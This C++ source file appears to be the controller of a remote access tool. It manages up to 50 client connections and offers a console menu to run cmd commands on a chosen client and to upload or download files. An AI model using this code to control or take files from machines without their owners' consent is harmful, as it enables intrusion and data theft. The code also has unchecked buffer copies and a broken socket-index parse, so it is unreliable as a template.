#include "main.h"


/*
	主函数
*/
int main(int argc, char **argv)
{
	tcpSocket socket("192.168.1.40", 81);     // 服务端开始监听并且等待客户端的连接
	if (!socket.tcpAccept())                 
		return false;

	//commandReduce(&socket);                    // 开始命令行的解析
	while (true)
	{
		;
	}
	return true;
}


/*
	解析命令行参数
*/
void commandReduce(tcpSocket *socket)
{
	string name;
	char commandLine[MAX_PATH] = { 0 }; char *separate;

	while (true)
	{
		cout << "input your command: ";
		getline(cin, name);
		if (strlen(name.data()) > MAX_PATH)
		{
			cout << " [!] Exceeded maximum length..." << endl;
			cout << "" << endl;
			continue;
		}
		ZeroMemory(commandLine, MAX_PATH);
		memcpy(commandLine, name.data(), strlen(name.data()));
		strcat(commandLine + strlen(commandLine), " ");

		separate = strchr(commandLine, '-');                                                                             // 寻找命令标识, 比如 -h -upload 等
		if (separate == NULL)
		{
			cout << " [!] Incorrect input..." << endl;
			cout << "" << endl;
			continue;
		}

		if (strncmp(separate, "-help ", 6) == 0 || strncmp(separate, "-h ", 3) == 0)								        // 命令行 -h
		{
			cout << "| -h / -help                                                                 显示帮助信息                   " << endl;
			cout << "| -c / -connect                                                              显示连接台数                   " << endl;
			cout << "| -s / -sendToClient [ownFilePath]  [clientFilePath] [socketNumber]          上传文件至远程客户端           " << endl;
			cout << "| -r / -recvToClient [ownFilePath]  [clientFilePath] [socketNumber]          从远程客户端下载文件           " << endl;
			cout << "| -x / -clientCmd    [socketNumber] [cmdChar]                                执行远程 cmd 命令              " << endl;
			cout << "| -q / -quit                                                                 退出                           " << endl;
			cout << "" << endl;
		}
		else if (strncmp(separate, "-clientCmd ", 11) == 0 || strncmp(separate, "-x ", 3) == 0)                          // 执行远程 cmd
		{
			char cmdChar[MAX_PATH] = { 0 }; char socketNumber[40] = { 0 };
			char s[2] = " "; char *token; int index = 0;

			token = strtok(separate, s);
			while (token != NULL) {
				index += 1;
				if (index == 2)                                               // 第一个参数
					memcpy(socketNumber, token, strlen(token));
				else if (index == 3)                                          // 第二个参数
					memcpy(cmdChar, token, strlen(token));
				else if (index > 10)
					break;
				else
				{
					strcat(cmdChar, " ");
					strcat(cmdChar, token);
				}
				token = strtok(NULL, s);
			}
			if (index < 10)
			{
				if (cmdExec(cmdChar, socketNumber, socket) == true)
				{
					cout << " [*] 执行命令成功" << endl;
				}
				else
				{
					cout << " [!] 执行命令失败" << endl;
				}
			}
			else
			{
				cout << " [!] Too few parameters..." << endl;
			}
			cout << "" << endl;
		}
		else if (strncmp(separate, "-recvToClient ", 14) == 0 || strncmp(separate, "-r ", 3) == 0)                          // 命令行 -u 上传
		{
			char ownFilePath[MAX_PATH] = { 0 }; char clientFilePath[MAX_PATH] = { 0 }; char socketNumber[40] = { 0 };
			char s[2] = " "; char *token; int index = 0;

			token = strtok(separate, s);
			while (token != NULL) {
				index += 1;
				if (index == 2)
					memcpy(ownFilePath, token, strlen(token));
				else if (index == 3)
					memcpy(clientFilePath, token, strlen(token));
				else if (index == 4)
					memcpy(socketNumber, token, strlen(token));
				else if (index > 4)
					break;
				token = strtok(NULL, s);
			}
			if (index == 4)
			{
				if (recvToClient(ownFilePath, clientFilePath, socketNumber, socket) == true)
				{
					cout << " [*] 传输文件成功" << endl;
				}
				else
				{
					cout << " [!] 传输文件失败" << endl;
				}
			}
			else
			{
				cout << " [!] Too few parameters..." << endl;
			}
			cout << "" << endl;
		}
		else if (strncmp(separate, "-sendToClient ", 14) == 0 || strncmp(separate, "-s ", 3) == 0)                        // 命令行 -d 下载
		{
			char ownFilePath[MAX_PATH] = { 0 }; char clientFilePath[MAX_PATH] = { 0 }; char socketNumber[40] = { 0 };
			char s[2] = " "; char *token; int index = 0;

			token = strtok(separate, s);
			while (token != NULL) {
				index += 1;
				if (index == 2)                                              
					memcpy(ownFilePath, token, strlen(token));
				else if (index == 3)                                   
					memcpy(clientFilePath, token, strlen(token));
				else if (index == 4)
					memcpy(socketNumber, token, strlen(token));
				else if (index > 4)
					break;
				token = strtok(NULL, s);
			}
			if (index == 4)
			{
				if (sendToClient(ownFilePath, clientFilePath, socketNumber, socket) == true)
				{
					cout << " [*] 传输文件成功" << endl;
				}
				else
				{
					cout << " [!] 传输文件失败" << endl;
				}
			}
			else
			{
				cout << " [!] Too few parameters..." << endl;
			}
			cout << "" << endl;
		}
		else if (strncmp(separate, "-connect ", 9) == 0 || strncmp(separate, "-c ", 3) == 0)                        // 命令行 -c 查看连接数
		{
			socket->threadToRefresh();
			tcpSocketPool *pool = connectionInfo(); int index = 0;
			cout << " | 连接的序号             IP 地址" << endl;
			for (int i = 0; i < 50; i++)
			{
				if (pool->isConnection == true)
				{
					cout << " | " << pool->sNumber << "                      " << pool->clientIp << endl;
					index += 1;
				}
				pool += 1;
			}
			if (index == 0)
				cout << "   无                     无" << endl;

			cout << "" << endl;
		}
		else if (strncmp(separate, "-quit ", 6) == 0 || strncmp(separate, "-q ", 3) == 0)                           // 命令行 -q 退出
		{
			cout << "" << endl;
			return;
		}
		else
		{
			cout << " [!] Incorrect input..." << endl;
			cout << "" << endl;
		}
	}
}

/*
struct myProtocol // 用于客户端和服务器端传输的协议
{
		type = 1 用于文件的上传
		type = 2 用于文件的下载
		type = 3 表示客户端或服务端是否准备好传输数据
		type = 12 表示执行失败
		
int type = 0;

int fileSize = 0;
char serverFile[MAX_PATH];        // 用于下载文件
char clientFile[MAX_PATH];        // 用于上传文件
};
*/

/*
	执行远程 cmd 命令 type = 4
*/
bool cmdExec(char *cmdChar, char *socketNumber, tcpSocket *socket)
{
	tcpSocketPool *pool; myProtocol cmd; HANDLE hHeap, hAlloc;
	socket->threadToRefresh();
	pool = connectionInfo();

	// 将 char 类型转换为 int
	int num1 = 0; int num2 = 0; int number = 0;
	num1 = *((byte *)socketNumber); num1 -= 48;
	if (strlen(socketNumber) == 2)
	{
		num2 = *((byte *)socketNumber + 1); num2 -= 48;
		number = num1 * 10 + num2;
	}
	number = num1;

	if (number >= 0 && number < 50)
	{
		if ((pool + number)->isConnection == false)
			return false;
	}
	else
		return false;
	
	int size = 100000;
	hHeap = HeapCreate(0, size, NULL);
	if (hHeap)
	{
		hAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
		if (!hAlloc)
			return false;
	}
	else
		return false;

	cmd.type = 4;
	memcpy(cmd.cmdChar, cmdChar, MAX_PATH);
	if (socket->tcpSend((pool + number)->socket, (char*)&cmd, sizeof(cmd)))
	{
		if (socket->tcpRecv((pool + number)->socket, (char *)hAlloc, size) == false)
			return false;
	}
	else
		return false;

	cout << (char *)hAlloc << endl;
	return true;
}


/*
	发送文件到客户端 type = 1
*/
bool sendToClient(char *ownFilePath, char *clientFilePath, char *socketNumber, tcpSocket *socket)
{
	tcpSocketPool *pool;
	myProtocol upload;

	socket->threadToRefresh();
	pool = connectionInfo();

	// 将 char 类型转换为 int
	int num1 = 0; int num2 = 0; int number = 0;
	num1 = *((byte *)socketNumber); num1 -= 48;
	if (strlen(socketNumber) == 2)
	{
		num2 = *((byte *)socketNumber + 1); num2 -= 48;
		number = num1 * 10 + num2;
	}
	number = num1;

	if (number >= 0 && number < 50)
	{
		if ((pool + number)->isConnection == false)
			return false;
	}
	else
		return false;

	// 打开服务端的文件
	file myfile(ownFilePath);
	HANDLE data = myfile.fileRead();
	if (data == false)
		return false;

	// 发送文件大小并且告知客户端存放的路径
	upload.type = 1;
	upload.fileSize = myfile.fileSizeL;
	memcpy(upload.clientFile, clientFilePath, MAX_PATH);
	if (socket->tcpSend((pool + number)->socket, (char*)&upload, sizeof(upload)))
	{
		if (socket->tcpRecv((pool + number)->socket, (char *)&upload, sizeof(upload)) == false)
			return false;
	}
	else
		return false;

	// 如果客户端准备就绪就开始发送文件
	if (upload.type == 3)
	{
		if (socket->tcpSend((pool + number)->socket, (char*)data, myfile.fileSizeL) == false)
			return false;
	}
	else
		return false;

	return true;
}


/*
	接收来自客户端的文件 type = 2
*/
bool recvToClient(char *ownFilePath, char *clientFilePath, char *socketNumber, tcpSocket *socket)
{
	tcpSocketPool *pool;
	myProtocol download;
	HANDLE hHeap; HANDLE hAlloc;
	bool result = true;

	// 获取 tcpSocketPool 结构体
	socket->threadToRefresh();
	pool = connectionInfo();
	
	// char 到 int 的转换
	int num1 = 0; int num2 = 0; int number = 0;
	num1 = *((byte *)socketNumber); num1 -= 48;
	if (strlen(socketNumber) == 2)
	{
		num2 = *((byte *)socketNumber + 1); num2 -= 48;
		number = num1 * 10 + num2;
	}
	number = num1;

	// number 必须满足条件,而且与客户端的连接不能断开
	if (number >= 0 && number < 50)
	{
		if ((pool + number)->isConnection == false)
			return false;
	}
	else
		return false;

	// 告知客户端要下载文件, 并且等待返回文件的大小
	download.type = 2;
	memcpy(download.clientFile, clientFilePath, MAX_PATH);
	if (socket->tcpSend((pool + number)->socket, (char*)&download, sizeof(download)))
	{
		if (socket->tcpRecv((pool + number)->socket, (char*)&download, sizeof(download)) == false)
			return false;
	}
	else
		return false;

	// 如果客户端准备就绪并且满足条件就创建堆用来准备接收客户端的数据
	if (download.type == 3)
	{
		if (download.fileSize < 0 || download.fileSize > 0x1f400000)
		{
			download.type = 12;
			socket->tcpSend((pool + number)->socket, (char *)&download, sizeof(download));
			return false;
		}
	}
	else
		return false;
	
	hHeap = HeapCreate(0, download.fileSize, NULL);
	if (hHeap)
	{
		hAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, download.fileSize);
		if (!hAlloc)
			return false;
	}
	else
		return false;

	// 告知服务端准备就绪之后就可以接收客户端的数据了
	download.type = 3;
	if (socket->tcpSend((pool + number)->socket, (char *)&download, sizeof(download)))
	{
		if (socket->tcpRecv((pool + number)->socket, (char *)hAlloc, download.fileSize) == false)
			return false;
	}
	else
		return false;

	// 最后在服务端创建文件
	file ownFile(ownFilePath);
	if (ownFile.fileWrite((char *)hAlloc, download.fileSize) == false)
		return false;

	HeapFree(hHeap, 0, hAlloc);
	return true;
}

